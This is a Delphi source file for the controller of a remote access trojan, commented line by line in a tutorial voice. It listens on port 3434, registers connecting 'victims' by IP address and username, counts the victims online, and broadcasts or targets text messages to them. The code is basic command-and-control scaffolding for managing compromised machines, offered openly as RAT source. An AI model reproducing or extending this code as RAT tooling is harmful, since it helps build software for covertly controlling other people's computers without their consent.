unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.Menus, Vcl.ComCtrls,
  System.Win.ScktComp;

//The following code is a Record with ONE thing inside it... A Username which is just a simple string.
type
  TClientData = record //record placeholder
    UserName: string;// a String to hold victims usernames in as they connect in... Keep in mind every victim that connects also creates a NEW Record with a different Username. 
  end;

type
  TForm1 = class(TForm)
    ListView1: TListView;
    StatusBar1: TStatusBar;
    PopupMenu1: TPopupMenu;
    B1: TMenuItem;
    S1: TMenuItem;
    ServerSocket1: TServerSocket;
    procedure FormCreate(Sender: TObject);
    procedure ServerSocket1ClientRead(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ServerSocket1ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure S1Click(Sender: TObject);
    procedure B1Click(Sender: TObject);
  private
    { Private declarations }
  public
    VictimCount:integer; // An integer variable used to keep count of how many victims are connected to the RAT...
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.B1Click(Sender: TObject);
var
I:integer;//Local Integer variable we will use for Looping...
begin
if self.ListView1.Selected = nil then exit; // if no victim selected DO NOTHING!

//we are now going to loop through ALL of the active victim connections and send this message... 'A MSG WOOT WOOT!'
for I := 0 to self.ServerSocket1.Socket.ActiveConnections-1 do
  begin
  //broadcast a message to all connected victims...
  self.ServerSocket1.Socket.Connections[I].SendText('A MSG WOOT WOOT!');
  end;
end;

//when the program first runs this is the first code that gets executed "The form gets Created"...
procedure TForm1.FormCreate(Sender: TObject);
begin
  self.VictimCount:=0;//setting victim count to 0 because we just ran the RAT so obviuosly no one will be connected "YET"...
  self.ServerSocket1.Port := 3434;//setting up the server socket to listen on port number 3434...
  self.ServerSocket1.Open;//telling the server socket to begin listening for incomming victim / Client connections...
  // update gui and display the server is active... ive done this at design time no need to code anything...
  //what i mean by this is if you look at the GUI it says listening on port 3434 and victims online: 0 by default when the RAT is first ran...
end;

procedure TForm1.S1Click(Sender: TObject);
var
  client: TCustomWinSocket;
  I: integer;
  ClientData: ^TClientData;
begin
  if Self.ListView1.Selected = nil then
    Exit;

  for I := 0 to Self.ServerSocket1.Socket.ActiveConnections - 1 do
  begin
    client := ServerSocket1.Socket.Connections[I];
    ClientData := client.Data;

    if Assigned(ClientData) and (ClientData.UserName = Self.ListView1.Selected.SubItems[0]) then
    begin
      client.SendText('MSG To ONE DUDE!');
      Break; // Exit the loop once the client is found
    end;
  end;
end;



//The following code will execute every single time a Victim / Client socket disconnects from our RAT Server socket...
procedure TForm1.ServerSocket1ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
var
  ClientData: ^TClientData;// This is a POINTER ^ to our TClientData "RECORD" at the top of the code... remember it holds one thing in it "UserName" which is a string...
  I: integer;// a locally created Integer variable we are going to simply use for looping...
begin
  ClientData := Socket.Data;//setting our clientdata pointer = to the current disconnecting sockets .Data Property... (it has all the data in it like Username)...
  // loop listivew and find the client and remove them...
  for I := 0 to Form1.ListView1.Items.Count - 1 do
  begin
    if Form1.ListView1.Items[I].SubItems[0] = ClientData.UserName then // loop the listview and if the listviews victim ID is = to the currently disconnecting clients Username DELETE IT from the listview...
    begin
      Form1.ListView1.Items[I].Delete;//deleting the victim from the listview component...
      Socket.Data := nil;// setting the sockets .data to NOTHING we are just clearing it out of RAM thats all... its that simple...
      Dispose(ClientData);// we now REMOVE this victims record from our RAM... its that simple :) 
    break;// as to not keep looping since we found the victim and removed them.... just break out of the loop no need to keep looping through all victims for no fucking reason...
    end;

  end;


  //Decrease the victim counter... and update it on the GUI...
  self.VictimCount:= self.VictimCount - 1;
  self.StatusBar1.Panels[1].Text:= 'Victims Online: ' + inttostr(self.VictimCount);
end;

procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
  Socket: TCustomWinSocket);
var
  ClientData: ^TClientData;// This is a POINTER ^ to our TClientData "RECORD" at the top of the code... remember it holds one thing in it "UserName" which is a string...
  sl: Tstringlist;//This is a String list variable.... its just a variable which can hold a list of strings like this 'hello|goodbye|blabla|whatever'
  li:Tlistitem;//This is a listitem variable which can be used to insert items into a listview component (the same component where the victims show up on the RAT)
begin
  sl := Tstringlist.Create;//firstly we must create the Tstringlist in RAM / Memory...
  sl.Delimiter := '|'; // We are going to be seperating our strings out using the PIPE | character...
  sl.StrictDelimiter := true;// we are setting the Tstringlist to StrictDelimiter this means 'This||wont be allowed' .....  'This|Is|Proper' means it only counts STRICTLY ONE PIPE between texts...
  sl.DelimitedText := Socket.ReceiveText;//setting the text to be checked and Delimited with PIPEs | the current text that the socket has just recieved from the Client socket...
  
  if sl[0] = 'NewCon' then //IF the server recieves text from a client and it begins with NewCon then the following code will execute... by the way NewCon simply means 'New Connection / New Victim'
  begin
    New(ClientData);//Creating a new Record for this NEW victim in RAM...
    ClientData.UserName := sl[1];//Setting the records Username for this new Victim to whatever we recived from the victim (whatever you made thier name on the client side) SHOULD be unique...
    Socket.Data := ClientData;//locking onto the current socket that just sent us some text and setting its .Data property to our newly created Record so it can hold the username...
    li:=form1.ListView1.Items.Add;//setting up our listitem to be added to the listview...
    li.Caption:= socket.RemoteAddress;//adding the victims IP address to the listview...
    li.SubItems.Add(sl[1]);//adding the victims ID / nickname to the listview...
    self.VictimCount:= self.VictimCount + 1;// adding +1 to our victim count because we just got a new connection...
    self.StatusBar1.Panels[1].Text:= 'Victims Online: ' + inttostr(self.VictimCount);// Updating the GUI to display the number of victims that are currently connected to the RAT...
  end;
end;

end.
